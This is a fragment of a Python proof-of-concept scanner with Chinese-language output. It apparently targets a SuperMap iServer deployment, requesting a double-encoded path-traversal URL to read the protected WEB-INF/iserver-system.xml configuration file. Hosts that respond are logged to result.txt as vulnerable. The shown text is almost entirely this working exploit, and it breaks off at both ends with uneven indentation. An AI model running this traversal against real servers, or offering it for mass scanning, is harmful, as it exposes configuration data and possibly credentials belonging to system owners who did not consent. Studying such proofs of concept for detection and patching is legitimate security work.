...
def poc(target):
    link = "/iserver/output/../WEB-IN%2546/iserver-system.xml"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
    }
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=20)
        if res1.status_code == 200:
                    res2 = requests.get(url=target+link,headers=headers,verify=False,timeout=20)
                        
        if "type" in res2.text:
                print(f"[+]该{target}存在xml泄露")
                                    #把结果写入到一个文件
                with open('result.txt','a',encoding="utf-8") as f:
                    f.write(f"[+]该{target}存在任xml泄露,\n")
        else:
                print(f"[-]该{target}不存在xml泄露")
    except:
